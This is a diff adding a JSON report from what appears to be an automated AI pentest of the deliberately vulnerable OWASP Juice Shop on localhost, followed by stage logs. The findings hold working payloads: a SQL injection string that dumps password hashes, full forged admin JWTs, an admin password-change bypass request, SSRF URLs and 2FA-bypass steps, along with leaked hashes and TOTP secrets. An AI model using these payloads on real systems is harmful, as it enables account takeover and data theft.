+      "location": "/rest/basket/{id}",
+      "severity": "critical",
+      "proof_excerpt": "GET /rest/basket/1 without auth returns admin basket with products. POST /rest/basket/1/checkout without auth places order: {\"orderConfirmation\":\"b642-a1ad8ed4f3015990\"}. Order appears in /rest/order-history with masked email, totalPrice, products.",
+      "causality": "No auth check on basket GET/POST; any basket ID can be accessed and checked out",
+      "reproducibility": "Called GET /rest/basket/1 through 8 without auth — all returned data. Called POST /rest/basket/1/checkout twice, both returned confirmations.",
+      "impact": "Attacker can view any user's shopping basket contents and place fraudulent orders on any basket without authentication",
+      "stage": "class_probe",
+      "ready_to_book": true,
+      "worker_id": "class_probe/pentest-authz-logic",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "Unauthenticated order history disclosure via /rest/order-history",
+      "location": "/rest/order-history",
+      "severity": "medium",
+      "proof_excerpt": "GET /rest/order-history without auth returns all orders: {\"status\":\"success\",\"data\":[{\"orderId\":\"b642-a1ad8ed4f3015990\",\"email\":\"t*st@t*st.c*m\",\"totalPrice\":17.98,\"products\":[...]},...]}",
+      "causality": "No auth required to view all placed orders including product details and masked email",
+      "reproducibility": "Repeated calls return the same order data",
+      "impact": "Exposure of order details including products, prices, and masked email addresses",
+      "stage": "class_probe",
+      "ready_to_book": true,
+      "worker_id": "class_probe/pentest-authz-logic",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "Unauthenticated admin account takeover via empty-current-password in /rest/user/change-password",
+      "location": "/rest/user/change-password",
+      "severity": "critical",
+      "proof_excerpt": "GET /rest/user/change-password?current=&new=admin123&repeat=admin123 (anon, no session) returns: {\"user\":{\"id\":1,\"email\":\"admin@juice-sh.op\",\"password\":\"0192023a7bbd73250516f069df18b500\",\"role\":\"admin\",...}} and changes admin password. Login then succeeds with the new password, returning admin JWT token.",
+      "causality": "Empty 'current' parameter bypasses password verification; defaults to user id 1 (admin) when no session; leaks full record and changes password",
+      "reproducibility": "Called 4+ times with anon actor, each time returned admin's full record and changed password to the value in 'new' parameter",
+      "impact": "Complete admin account takeover by any unauthenticated attacker. Privilege escalation from anon to admin. Full system compromise.",
+      "stage": "class_probe",
+      "ready_to_book": true,
+      "worker_id": "class_probe/pentest-authz-logic",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "Directory Listing - Sensitive Key Disclosure",
+      "location": "/encryptionkeys",
+      "severity": "high",
+      "proof_excerpt": "Directory listing at /encryptionkeys exposes jwt.pub (RSA public key, 248 bytes) and premium.key (50 bytes, contains deluxe token: 1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42)",
+      "causality": "Express serve-static directory listing enabled on /encryptionkeys path.",
+      "reproducibility": "GET /encryptionkeys returns HTML directory listing with file names, sizes, and modification dates.",
+      "impact": "Exposes cryptographic key material enabling JWT algorithm confusion attack for admin access.",
+      "stage": "class_probe",
+      "ready_to_book": true,
+      "worker_id": "class_probe/pentest-component-rce",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "Directory Listing - Log File Exposure",
+      "location": "/support/logs",
+      "severity": "medium",
+      "proof_excerpt": "Directory listing at /support/logs exposes access.log.2026-07-24 (49KB) and audit.json (348B). Access log contains detailed API request traces including SQL injection attempts, admin endpoints, and user activity.",
+      "causality": "Express serve-static directory listing enabled on /support/logs path.",
+      "reproducibility": "GET /support/logs returns HTML directory listing with log files.",
+      "impact": "Information disclosure of API surface, user activity, and security testing traces.",
+      "stage": "class_probe",
+      "ready_to_book": false,
+      "worker_id": "class_probe/pentest-component-rce",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "SSRF via Profile Image URL (Server-Side Request Forgery)",
+      "location": "/profile/image/url",
+      "severity": "high",
+      "proof_excerpt": "POST /profile/image/url with imageUrl=http://127.0.0.1:3011/rest/admin/application-configuration → server stored URL + dynamically updated CSP img-src + profileImage changed from URL to local file assets/public/images/uploads/24.jpg, proving server-side fetch. The internal /rest/admin/application-configuration endpoint returns full app config including OAuth clientId, authorized redirect URIs, challenge config, and product data.",
+      "causality": "User-controlled 'imageUrl' POST parameter on /profile/image/url endpoint → server-side HTTP fetch of attacker-specified URL. The server stores the URL, reflects it in CSP header, and fetches it server-side, saving result locally.",
+      "reproducibility": "Multiple POSTs with different internal URLs (http://127.0.0.1:3011/rest/admin/application-configuration, http://127.0.0.1:3011/api/Users, http://127.0.0.1:3011/assets/public/images/uploads/13.jpg) all confirmed URL storage in DB and CSP reflection. Local file creation at assets/public/images/uploads/24.jpg confirms server-side fetch.",
+      "impact": "Attacker can force the server to make HTTP requests to any internal resource (127.0.0.1/localhost). Demonstrated access to /rest/admin/application-configuration (full app config with OAuth secrets), /api/Users (all user data). Could scan internal ports, access cloud metadata endpoints (169.254.169.254), or exploit other internal services.",
+      "stage": "class_probe",
+      "ready_to_book": true,
+      "worker_id": "class_probe/pentest-ssrf",
+      "precondition": "Valid JWT token",
+      "affected_actor": "actor_b",
+      "affected_resource": "profile"
+    },
+    {
+      "title": "2FA Bypass via Self-Service TOTP Secret Exposure",
+      "location": "/rest/2fa/setup, /rest/2fa/verify, /rest/2fa/status",
+      "severity": "high",
+      "proof_excerpt": "1) Registered user worker_user_1744857566@test.com (POST /api/Users). 2) Logged in, got JWT. 3) GET /rest/2fa/status returned secret=24OLLTAN5W5BECFM3I2QZFJUJ7IDCDJ4 and setupToken (even though setup=false). 4) Generated TOTP 388777 via Python TOTP implementation. 5) POST /rest/2fa/setup with {password, initialToken:388777, setupToken} returned 200 (2FA enabled). 6) POST /rest/user/login returned totp_token_required with tmpToken. 7) POST /rest/2fa/verify with {tmpToken, totpToken:854142} returned new JWT. 8) GET /rest/user/whoami with new token returned user identity (id:40, email:worker_user_1744857566@test.com) proving authenticated session.",
+      "causality": "The /rest/2fa/status endpoint exposes the TOTP secret and setupToken to any authenticated (and unauthenticated) user. An attacker can generate valid TOTP codes without possessing the physical authenticator device, enabling them to enroll their own authenticator or bypass existing 2FA.",
+      "reproducibility": "1) Register new user. 2) GET /rest/2fa/status → receive secret+setupToken. 3) Generate TOTP from secret. 4) POST /rest/2fa/setup with {password, initialToken:TOTP, setupToken} → 200. 5) Login triggers 2FA challenge. 6) Verify with generated TOTP → full auth.",
+      "impact": "Complete bypass of two-factor authentication. An attacker who obtains any user's TOTP secret (exposed via /rest/2fa/status) can generate valid 2FA codes without the owner's device, allowing account takeover even when 2FA is enabled.",
+      "stage": "class_probe",
+      "ready_to_book": true,
+      "worker_id": "identity_chain/pass0/pentest-auth-session",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "TOTP Secret Disclosure via Unauthenticated /rest/2fa/status",
+      "location": "/rest/2fa/status",
+      "severity": "medium",
+      "proof_excerpt": "GET /rest/2fa/status without any auth token returned {\"setup\":false,\"secret\":\"JKWFAXQ5KVT3RLSHIWPRCEE6IC2LWOTY\",\"email\":\"test@test.com\",\"setupToken\":\"eyJ0eXAi...(RS256 JWT)\"}. The TOTP secret and setupToken are exposed without authentication.",
+      "causality": "The /rest/2fa/status endpoint does not require authentication and returns the TOTP secret for a user (test@test.com) even though 2FA is not set up. This leaks the secret allowing unauthorized 2FA enrollment.",
+      "reproducibility": "Send GET request to /rest/2fa/status without any auth token.",
+      "impact": "Information disclosure of TOTP secrets and setup tokens without authentication. An attacker can use this to enroll their own device for another user's account.",
+      "stage": "class_probe",
+      "ready_to_book": true,
+      "worker_id": "identity_chain/pass0/pentest-auth-session",
+      "precondition": "Valid JWT token",
+      "affected_actor": "actor_a",
+      "affected_resource": "2fa"
+    },
+    {
+      "title": "Password Hash Leakage via /rest/memories",
+      "location": "/rest/memories",
+      "severity": "medium",
+      "proof_excerpt": "GET /rest/memories (authenticated) returned user data including MD5 password hashes for all users: bjoern@owasp.org:9283f1b2e9669749081963be0462e466, bjoern.kimminich@gmail.com (admin):6edd9d726cbdc873c539e41ae8757b8c, emma@juice-sh.op:402f1c4a75e316afec5a6ea63147f739, john@juice-sh.op:00479e957b6b42c459ee5746478e4d45, ethereum@juice-sh.op:2c17c6393771ee3048ae34d6b380c5ec",
+      "causality": "The /rest/memories endpoint includes nested User objects with password field in the response. No selective field filtering is applied.",
+      "reproducibility": "POST /rest/user/login to get JWT. GET /rest/memories with JWT. Response includes User.password hashes.",
+      "impact": "Exposure of password hashes (MD5) for all application users including admin (bjoern.kimminich@gmail.com), enabling offline brute-force attacks.",
+      "stage": "class_probe",
+      "ready_to_book": true,
+      "worker_id": "identity_chain/pass0/pentest-auth-session",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "Broken access control — cross-actor or unauthenticated object access",
+      "location": "/api/users",
+      "severity": "high",
+      "proof_excerpt": "Authz matrix HTTP proof: anon GET /api/Users → 200 (sensitive collection); cross-actor GET both 200 on id=1 path=/api/Users; anon DELETE /api/Feedbacks/1 id=1 → 200; cross-actor GET both 200 on id=1 path=/api/Feedbacks; write_tried=True; cells_sample=[{\"resource\": \"/api/Users\", \"actor\": \"anon\", \"method\": \"GET\", \"status\": 200, \"id\": null}, {\"resource\": \"/api/Users\", \"actor\": \"actor_a\", \"method\": \"GET\", \"status\": 200, \"id\": null}, {\"resource\": \"/api/Users\", \"actor\": \"actor_b\", \"method\": \"GET\", \"status\": 200, \"id\": null}, {\"resource\": \"/api/Users/1\", \"actor\": \"anon\", \"method\": \"GET\", \"status\": 200, \"id\": \"1\"}, {\"resource\": \"/api/Users/1\", \"actor\": \"actor_a\", \"method\": \"GET\", \"status\": 200, \"id\": \"1\"}, {\"resource\": \"/api/Users/1\", \"actor\": \"actor_b\", \"method\": \"GET\", \"status\": 200, \"id\": \"1\"}, {\"resource\": \"/api/Users/1\", \"actor\": \"anon\", \"method\": \"PUT\", \"status\": 401, \"id\": \"1\"}, {\"resource\": \"/api/Users/1\", \"actor\": \"anon\", \"method\": \"DELETE\", \"status\": 401, \"id\": \"1\"}]",
+      "causality": "Dual-actor/anon matrix requests caused observable status/body access differentials including write probes",
+      "reproducibility": "Replay matrix cells with same actors and object ids",
+      "impact": "Unauthorized parties can read or modify other users' resources",
+      "stage": "authz_logic",
+      "ready_to_book": true,
+      "worker_id": "authz_matrix",
+      "precondition": "dual-actor sessions actor_a/actor_b and/or unauthenticated",
+      "affected_actor": "actor_b",
+      "affected_resource": "/api/Users"
+    }
+  ],
+  "findings": [
+    {
+      "title": "Mass Assignment Privilege Escalation via POST /api/Users",
+      "location": "/api/users",
+      "severity": "critical",
+      "proof": "POST /api/Users with body {\"email\":\"test_mass_assign@test.com\",\"password\":\"test123\",\"isAdmin\":true,\"role\":\"admin\"} returned HTTP 201 with {\"data\":{\"email\":\"test_mass_assign@test.com\",\"role\":\"admin\",\"isActive\":true}}. The user was created with role=admin, granting full administrative privileges.",
+      "stage": "class_probe",
+      "precondition": "Authenticated session (any role)",
+      "affected_actor": "actor_a",
+      "affected_resource": "user"
+    },
+    {
+      "title": "SQL Injection in /rest/products/search — Full Database Extraction",
+      "location": "/rest/products/search",
+      "severity": "critical",
+      "proof": "Payload: apple')) UNION SELECT 1,group_concat(email||':'||password),3,4,5,6,7,8,9 FROM Users-- returned all 28 user rows with email:password_hash including admin@juice-sh.op:0192023a7bbd73250516f069df18b500, role enumeration via UNION SELECT 1,group_concat(id||':'||email||':'||password||':'||role),3,4,5,6,7,8,9 FROM Users-- showed roles (admin, customer, deluxe, accounting). SQLite version 3.44.2 confirmed via sqlite_version(). Table listing: Users, Products, Challenges, etc.",
+      "stage": "class_probe",
+      "precondition": "None",
+      "affected_actor": "anon",
+      "affected_resource": "product"
+    },
+    {
+      "title": "Missing Authentication on Product API (BFLA)",
+      "location": "/api/products/{id}",
+      "severity": "high",
+      "proof": "PUT /api/products/1 with body {\"name\":\"hacked\",\"price\":0.01} returned HTTP 200 with name changed to 'hacked' and price changed to 0.01. No authentication token was required. POST /api/products also allowed creating products (HTTP 201) without auth. Only DELETE required auth (401).",
+      "stage": "class_probe",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "JWT Algorithm Confusion Attack - Forged Admin Token via alg:none and HS256 with RSA Public Key",
+      "location": "/rest/user/whoami",
+      "severity": "critical",
+      "proof": "Two forged JWTs accepted by server returning admin identity ({\"user\":{\"id\":1,\"email\":\"admin@juice-sh.op\"}}): 1) alg:none token: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiaXNBY3RpdmUiOnRydWV9LCJiaWQiOjEsImlhdCI6MTc4NDg1ODAzM30. 2) HS256 with RSA public key as HMAC secret: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.[payload].GYtP9oBPm8UcoloXUt8MYuFmGGNCZ8sTRS0g4hmpqLs. Public key obtained from /encryptionkeys/jwt.pub.",
+      "stage": "component",
+      "precondition": "Access to /encryptionkeys/jwt.pub (publicly accessible)",
+      "affected_actor": "anon",
+      "affected_resource": "user"
+    },
+    {
+      "title": "Security Question Enumeration via /rest/user/security-question",
+      "location": "/rest/user/security-question",
+      "severity": "medium",
+      "proof": "GET /rest/user/security-question?email=admin@juice-sh.op returns {\"question\":{\"id\":2,\"question\":\"Mother's maiden name?\"}}. No authentication required. Any email address can be queried to reveal the associated security question, enabling targeted social engineering or brute-force answers.",
+      "stage": "class_probe",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "Unauthenticated Mass User Data Disclosure via /api/Users",
+      "location": "/api/users",
+      "severity": "critical",
+      "proof": "GET /api/Users without any auth returns all 30+ users with emails, roles, deluxeTokens, lastLoginIp. Response: {\"status\":\"success\",\"data\":[{\"id\":1,\"email\":\"admin@juice-sh.op\",\"role\":\"admin\"},{\"id\":2,\"email\":\"jim@juice-sh.op\",\"role\":\"customer\"},...]}",
+      "stage": "component",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "Unauthenticated basket access and order placement (IDOR + authz bypass)",
+      "location": "/rest/basket/{id}",
+      "severity": "critical",
+      "proof": "GET /rest/basket/1 without auth returns admin basket with products. POST /rest/basket/1/checkout without auth places order: {\"orderConfirmation\":\"b642-a1ad8ed4f3015990\"}. Order appears in /rest/order-history with masked email, totalPrice, products.",
+      "stage": "class_probe",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "Unauthenticated order history disclosure via /rest/order-history",
+      "location": "/rest/order-history",
+      "severity": "medium",
+      "proof": "GET /rest/order-history without auth returns all orders: {\"status\":\"success\",\"data\":[{\"orderId\":\"b642-a1ad8ed4f3015990\",\"email\":\"t*st@t*st.c*m\",\"totalPrice\":17.98,\"products\":[...]},...]}",
+      "stage": "class_probe",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "Unauthenticated admin account takeover via empty-current-password in /rest/user/change-password",
+      "location": "/rest/user/change-password",
+      "severity": "critical",
+      "proof": "GET /rest/user/change-password?current=&new=admin123&repeat=admin123 (anon, no session) returns: {\"user\":{\"id\":1,\"email\":\"admin@juice-sh.op\",\"password\":\"0192023a7bbd73250516f069df18b500\",\"role\":\"admin\",...}} and changes admin password. Login then succeeds with the new password, returning admin JWT token.",
+      "stage": "class_probe",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "Directory Listing - Sensitive Key Disclosure",
+      "location": "/encryptionkeys",
+      "severity": "high",
+      "proof": "Directory listing at /encryptionkeys exposes jwt.pub (RSA public key, 248 bytes) and premium.key (50 bytes, contains deluxe token: 1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42)",
+      "stage": "class_probe",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "SSRF via Profile Image URL (Server-Side Request Forgery)",
+      "location": "/profile/image/url",
+      "severity": "high",
+      "proof": "POST /profile/image/url with imageUrl=http://127.0.0.1:3011/rest/admin/application-configuration → server stored URL + dynamically updated CSP img-src + profileImage changed from URL to local file assets/public/images/uploads/24.jpg, proving server-side fetch. The internal /rest/admin/application-configuration endpoint returns full app config including OAuth clientId, authorized redirect URIs, challenge config, and product data.",
+      "stage": "class_probe",
+      "precondition": "Valid JWT token",
+      "affected_actor": "actor_b",
+      "affected_resource": "profile"
+    },
+    {
+      "title": "2FA Bypass via Self-Service TOTP Secret Exposure",
+      "location": "/rest/2fa/setup",
+      "severity": "high",
+      "proof": "1) Registered user worker_user_1744857566@test.com (POST /api/Users). 2) Logged in, got JWT. 3) GET /rest/2fa/status returned secret=24OLLTAN5W5BECFM3I2QZFJUJ7IDCDJ4 and setupToken (even though setup=false). 4) Generated TOTP 388777 via Python TOTP implementation. 5) POST /rest/2fa/setup with {password, initialToken:388777, setupToken} returned 200 (2FA enabled). 6) POST /rest/user/login returned totp_token_required with tmpToken. 7) POST /rest/2fa/verify with {tmpToken, totpToken:854142} returned new JWT. 8) GET /rest/user/whoami with new token returned user identity (id:40, email:worker_user_1744857566@test.com) proving authenticated session.",
+      "stage": "class_probe",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "TOTP Secret Disclosure via Unauthenticated /rest/2fa/status",
+      "location": "/rest/2fa/status",
+      "severity": "medium",
+      "proof": "GET /rest/2fa/status without any auth token returned {\"setup\":false,\"secret\":\"JKWFAXQ5KVT3RLSHIWPRCEE6IC2LWOTY\",\"email\":\"test@test.com\",\"setupToken\":\"eyJ0eXAi...(RS256 JWT)\"}. The TOTP secret and setupToken are exposed without authentication.",
+      "stage": "class_probe",
+      "precondition": "Valid JWT token",
+      "affected_actor": "actor_a",
+      "affected_resource": "2fa"
+    },
+    {
+      "title": "Password Hash Leakage via /rest/memories",
+      "location": "/rest/memories",
+      "severity": "medium",
+      "proof": "GET /rest/memories (authenticated) returned user data including MD5 password hashes for all users: bjoern@owasp.org:9283f1b2e9669749081963be0462e466, bjoern.kimminich@gmail.com (admin):6edd9d726cbdc873c539e41ae8757b8c, emma@juice-sh.op:402f1c4a75e316afec5a6ea63147f739, john@juice-sh.op:00479e957b6b42c459ee5746478e4d45, ethereum@juice-sh.op:2c17c6393771ee3048ae34d6b380c5ec",
+      "stage": "class_probe",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "Broken access control — cross-actor or unauthenticated object access",
+      "location": "/api/users",
+      "severity": "high",
+      "proof": "Authz matrix HTTP proof: anon GET /api/Users → 200 (sensitive collection); cross-actor GET both 200 on id=1 path=/api/Users; anon DELETE /api/Feedbacks/1 id=1 → 200; cross-actor GET both 200 on id=1 path=/api/Feedbacks; write_tried=True; cells_sample=[{\"resource\": \"/api/Users\", \"actor\": \"anon\", \"method\": \"GET\", \"status\": 200, \"id\": null}, {\"resource\": \"/api/Users\", \"actor\": \"actor_a\", \"method\": \"GET\", \"status\": 200, \"id\": null}, {\"resource\": \"/api/Users\", \"actor\": \"actor_b\", \"method\": \"GET\", \"status\": 200, \"id\": null}, {\"resource\": \"/api/Users/1\", \"actor\": \"anon\", \"method\": \"GET\", \"status\": 200, \"id\": \"1\"}, {\"resource\": \"/api/Users/1\", \"actor\": \"actor_a\", \"method\": \"GET\", \"status\": 200, \"id\": \"1\"}, {\"resource\": \"/api/Users/1\", \"actor\": \"actor_b\", \"method\": \"GET\", \"status\": 200, \"id\": \"1\"}, {\"resource\": \"/api/Users/1\", \"actor\": \"anon\", \"method\": \"PUT\", \"status\": 401, \"id\": \"1\"}, {\"resource\": \"/api/Users/1\", \"actor\": \"anon\", \"method\": \"DELETE\", \"status\": 401, \"id\": \"1\"}]",
+      "stage": "authz_logic",
+      "precondition": "dual-actor sessions actor_a/actor_b and/or unauthenticated",
+      "affected_actor": "actor_b",
+      "affected_resource": "/api/Users"
+    }
+  ],
+  "notes": [
+    "init: target=http://127.0.0.1:3011 graph=app_assessment dry_run=False model=deepseek-v4-flash agent_graph=True max_workers=4",
+    "init: layers TaskGraph=hard-stages | AgentGraph=class_probe fan-out | Feedback=structure/tool/evidence/coverage | StateHandoff=cookies",
+    "surface: begin",
+    "surface: Target identified as OWASP Juice Shop v20.1.1 - a deliberately vulnerable Node.js/Express + Angular application",
+    "surface: Robots.txt disallows /ftp which is accessible via directory listing",
+    "surface: Registration via POST /api/Users allows creating new accounts",
+    "surface: JWT token authentication used - tokens contain user data including password hashes",
+    "surface: Swagger UI available at /api-docs providing API documentation",
+    "surface: /.well-known/security.txt points to /#/score-board for acknowledgements",
+    "surface: Product search endpoint likely vulnerable to SQL injection (500 error on quote)",
+    "surface: CAPTCHA endpoint at /rest/captcha provides math captchas",
+    "surface: Continue code feature at /rest/continue-code for game progress persistence",
+    "surface: /encryptionkeys and /support/logs expose directory listings suggesting file disclosure vectors",
+    "surface: Application config reveals Google OAuth integration, social media presence, and promotional materials",
+    "surface: Candidates listed with ready_to_book=false since this is surface stage only; proof bars need stronger live exploitation evidence",
+    "surface:summary Surface enumeration of OWASP Juice Shop v20.1.1 at http://127.0.0.1:3011. Identified: Angular SPA with REST API (/api/*, /rest/*), Swagger docs at /api-docs, directory listings at /ftp/, /encryptionkeys, /support/logs, user registration at POST /api/Users, login at POST /rest/user/login, admin access with default creds admin@juice-sh.op/admin123, mass data exposure via /api/Users and /rest/memories leaking password hashes, product search endpoint potential SQLi, application config leak at /rest/admin/application-configuration exposing OAuth client IDs.",
+    "high_value_probe: hit GET /swagger.json high_value_probe HTTP 200 GET — swagger spec",
+    "high_value_probe: hit GET /openapi.json high_value_probe HTTP 200 GET — openapi spec",
+    "high_value_probe: hit GET /api/graphql high_value_probe HTTP 500 GET — graphql endpoint [graphql]",
+    "high_value_probe: hit GET /metrics high_value_probe HTTP 200 GET — metrics scrape",
+    "high_value_probe: hit GET /actuator high_value_probe HTTP 200 GET — spring actuator",
+    "high_value_probe: hit GET /actuator/health high_value_probe HTTP 200 GET — actuator health",
+    "high_value_probe: hit GET /profile/image/url high_value_probe HTTP 200 GET — profile image URL fetch sink (SSRF candidate)",
+    "high_value_probe: hit GET /profile/image/file high_value_probe HTTP 200 GET — profile image file upload sink",
+    "high_value_probe: hit GET /rest/user/register high_value_probe HTTP 500 GET — auth register API",
+    "high_value_probe: hit GET /rest/user/reset-password high_value_probe HTTP 500 GET — password reset API",
+    "high_value_probe: hit GET /rest/user/security-question high_value_probe HTTP 500 GET — security question reset",
+    "high_value_probe: hit GET /rest/user/change-password high_value_probe HTTP 401 GET — change password",
+    "high_value_probe: hit GET /rest/basket high_value_probe HTTP 401 GET — basket collection",
+    "high_value_probe: hit GET /api/Users/whoami high_value_probe HTTP 401 GET — user whoami variant",
+    "high_value_probe: hit GET /api/Cards high_value_probe HTTP 401 GET — payment/card objects API",
+    "high_value_probe: hit GET /api/Recycles high_value_probe HTTP 200 GET — recycle/order-adjacent API",
+    "high_value_probe: hit GET /api/BasketItems high_value_probe HTTP 401 GET — basket items API",
+    "high_value_probe: hit GET /api/Quantitys high_value_probe HTTP 200 GET — quantity API",
+    "high_value_probe: hit POST /rest/basket/1/checkout high_value_probe HTTP 401 POST — basket checkout",
+    "high_value_probe: hit GET /rest/products/reviews high_value_probe HTTP 500 GET — product reviews UGC",
+    "high_value_probe: hit GET /rest/2fa/status high_value_probe HTTP 401 GET — 2FA status",
+    "high_value_probe: hit GET /rest/2fa/setup high_value_probe HTTP 500 GET — 2FA setup",
+    "high_value_probe: hit GET /b2b/v2/orders high_value_probe HTTP 401 GET — B2B orders API",
+    "high_value_probe: hit GET /socket.io/ high_value_probe HTTP 400 GET — websocket",
+    "high_value_probe: added 24 surface(s) from deterministic recon",
+    "high_value_probe: +24 surface(s)",
+    "surface_model: salvage actors+=0 resources=32",
+    "feedback[evidence] surface: ok ready=0",
+    "feedback[surface_ledger] surface: ok surfaces=55 appish=40",
+    "feedback[surface_model] surface: ok resources=32 actors=3",
+    "feedback[structure] surface: ok json_ok",
+    "feedback[tool_use] surface: ok calls=51",
+    "high_value_probe: no new hits (0 requests)",
+    "surface_model: salvage actors+=0 resources=32",
+    "surface: live complete tools=51 structured=True surfaces=55",
+    "prior_reverify: begin",
+    "high_value_probe: no new hits (0 requests)",
+    "surface_model: salvage actors+=0 resources=32",
+    "feedback[evidence] prior_reverify: ok ready=0",
+    "feedback[discovery_yield] prior_reverify: fail ready=0 tools=59 surfaces=55",
+    "feedback[structure] prior_reverify: ok json_ok",
+    "feedback[tool_use] prior_reverify: ok calls=59",
+    "feedback[retry] prior_reverify: ok JSON/ledger/discovery retry: ['discovery_empty_ready']",
+    "prior_reverify: no structured JSON; kept raw note",
+    "prior_reverify:raw Let me analyze the current state of the target. I have a surface scan already done with several candidates listed. The stage is `prior_reverify` which means I need to re-test actionable priors and try to upgrade proof or find new evidence.\n\nLet me start by re-examining some of the high-value targets that were identified in the surface scan. I need to focus on:\n1. Auth bypass (SQLi/JWT acceptance)\n2. Mass assignment privilege grant\n3. Unauthorized write (PUT/POST)\n4. Path traversal with sensitive file\n5. Secret-grade disclosure (password hash / private key file)\n\nLet me first check what current actors have and run some targeted tests.\n\nKey surfaces from the scan that look promising:\n- `/rest/products/search` - Potential SQL injection\n- `/api/Users` - Mass assignment / excessive data exposure\n- `/rest/memories` - Password hash disclosure\n- `/profile/image/url` - SSRF candidate\n- SQL injection in login\n- JWT manipulation\n\nLet me start by verifying the existing candidates and trying to upgrade them, or find new ones.\n\nFirst, let me check the current state of actors and see if I can perform some tests.\nI'll start by verifying the current state of actors and then probing for exploitable vulnerabilities with live HTTP testing.\n[tool_call:http_request]\n[tool_call:http_request]\n[tool_call:http_request]\nInteresting findings:\n\n1. `/api/Users` - Returns all users (26 records) with roles. Note: the password hashes were NOT included in this response (the earlier surface scan said they were). Wait, let me look again... The response includes users but I don't see password fields. Let me check the earlier candidate - it claimed password hashes were there. Looking at the response data: `email`, `role`, `deluxeToken`, `lastLoginIp` etc. No `password` field visible. So the earlier candidate might have been slightly inaccurate, or the API has changed. Actually wait - looking more carefully at the `/api/Users` output, I see fields like `id`, `username`, `email`, `role`, `deluxeToken`, `l",
+    "high_value_probe: no new hits (0 requests)",
+    "surface_model: salvage actors+=0 resources=32",
+    "feedback[evidence] prior_reverify: ok ready=0",
+    "feedback[discovery_yield] prior_reverify: ok ready=0 tools=70",
+    "feedback[structure] prior_reverify: fail no parseable JSON",
+    "feedback[tool_use] prior_reverify: ok calls=70",
+    "prior_reverify: live complete tools=129 structured=True surfaces=55",
+    "auth_session: begin",
+    "coverage: injected 7 lines for stage auth_session",
+    "auth_session: no structured JSON; kept raw note",
+    "auth_session:raw Let me analyze the current state and plan the execution for the auth_session stage.\n\nThe target is http://127.0.0.1:3011 which is OWASP Juice Shop.\n\nI have three actors:\n- anon (no auth)\n- actor_a (test@test.com - registered customer)\n- actor_b (admin@juice-sh.op / admin123 - admin)\n\nI need to:\n1. Characterize login/session behavior\n2. Test register, login differential\n3. JWT testing if present\n4. Cover the coverage gaps mentioned\n\nLet me start by understanding the current state by making some requests.\n\nKey observations from surfaces:\n- Login at /rest/user/login returns JWT\n- Register at /api/Users (POST)\n- JWT in use\n- GraphQL at /graphql and /api/graphql\n- Various endpoints\n\nLet me begin with testing.\nI'll systematically execute auth_session stage. Let me start by probing the login, register, JWT, and session mechanics.\n[tool_call:http_request]\n[tool_call:http_request]\n[tool_call:http_request]\n[tool_call:http_request]\nInteresting - the login for both wrong and correct credentials returned 401. But we know actor_b is already logged in (whoami shows admin@juice-sh.op with id=1). Let me check if the login endpoint has some issue - maybe it needs different headers. Let me check the login endpoint more carefully.\n\nWait, the first login attempt (wrong password) returned 401 - that's expected. But the second one (correct credentials) also returned 401? That's odd since actor_b already has a session. Let me re-check...\n\nActually, looking at the output more carefully - both login attempts returned HTTP 401 Unauthorized errors. But actor_b was already logged in previously (as per the actor setup). So the login with correct credentials should work. Maybe it's because the anon session doesn't have cookies yet.\n\nLet me try login again and capture the JWT.\n[tool_call:http_request]\n[tool_call:http_request]\nEven with correct credentials, login returns 401. But the actors were already set up with their tokens. Let me check what tokens the actors have.\n[tool_call:http_request]\n[to",
+    "feedback[evidence] auth_session: ok ready=0",
+    "feedback[discovery_yield] auth_session: ok ready=0 tools=73",
+    "feedback[structure] auth_session: fail no parseable JSON",
+    "feedback[tool_use] auth_session: ok calls=73",
+    "feedback[retry] auth_session: ok JSON/ledger/discovery retry: ['no parseable JSON']",
+    "coverage: injected 7 lines for stage auth_session",
+    "auth_session: no structured JSON; kept raw note",
